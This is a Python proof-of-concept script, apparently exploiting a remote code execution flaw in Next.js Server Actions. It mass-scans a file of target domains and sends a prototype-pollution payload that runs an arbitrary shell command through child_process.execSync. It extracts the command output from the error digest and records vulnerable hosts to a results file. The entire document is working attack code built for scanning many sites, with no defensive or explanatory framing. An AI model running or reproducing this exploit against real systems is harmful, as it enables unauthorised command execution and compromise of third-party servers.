# /// script
# dependencies = ["requests"]
# ///
import requests
import sys
import json
import re
import urllib3
from requests.exceptions import RequestException, Timeout

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =====================
# ARGUMENT
# =====================
if len(sys.argv) < 2:
    print("Usage: python poc1.py targets.txt \"whoami\" [http|https]")
    sys.exit(1)

TARGET_FILE = sys.argv[1]
EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "id"
PRIMARY_SCHEME = sys.argv[3] if len(sys.argv) > 3 else "http"
FALLBACK_SCHEME = "https" if PRIMARY_SCHEME == "http" else "http"

RETRY_COUNT = 3
OUTPUT_FILE = "result.txt"

# =====================
# PAYLOAD
# =====================
crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": (
            "var res = process.mainModule.require('child_process')"
            f".execSync('{EXECUTABLE}',{{timeout:5000}})"
            ".toString().trim();"
            " throw Object.assign(new Error('NEXT_REDIRECT'),"
            " {digest:`${res}`});"
        ),
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}

headers = {"Next-Action": "x"}

# =====================
# HELPER (DITAMBAHKAN)
# =====================
def is_valid_domain(domain):
    domain = domain.strip()

    if not domain:
        return False

    if domain.startswith((".", "*")):
        return False

    if " " in domain:
        return False

    domain = re.sub(r"^https?://", "", domain)
    domain = domain.split("/")[0]
    domain = domain.split(":")[0]

    domain_regex = re.compile(
        r"^(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$"
    )

    return bool(domain_regex.match(domain))


def normalize(domain, scheme):
    domain = domain.strip().rstrip("/")
    if domain.startswith("http://") or domain.startswith("https://"):
        return domain
    return f"{scheme}://{domain}"


def extract_digest(text):
    match = re.search(r'"digest"\s*:\s*"([^"]+)"', text)
    return match.group(1) if match else None


def try_request(url):
    try:
        r = requests.post(
            url,
            files=files,
            headers=headers,
            timeout=10,
            verify=False
        )
        return extract_digest(r.text)
    except (Timeout, RequestException):
        return None


# =====================
# MAIN LOOP
# =====================
with open(TARGET_FILE, "r") as f, open(OUTPUT_FILE, "a") as out:
    for line in f:
        domain = line.strip()

        # ⬇️ AUTO SKIP DOMAIN TIDAK VALID (TAMBAHAN SAJA)
        if not is_valid_domain(domain):
            continue

        success = False

        for scheme in [PRIMARY_SCHEME, FALLBACK_SCHEME]:
            url = normalize(domain, scheme)

            for attempt in range(1, RETRY_COUNT + 1):
                digest = try_request(url)

                if digest:
                    print(f"[VALID] {url} => {digest}")
                    out.write(f"{url} | {digest}\n")
                    out.flush()
                    success = True
                    break

            if success:
                break
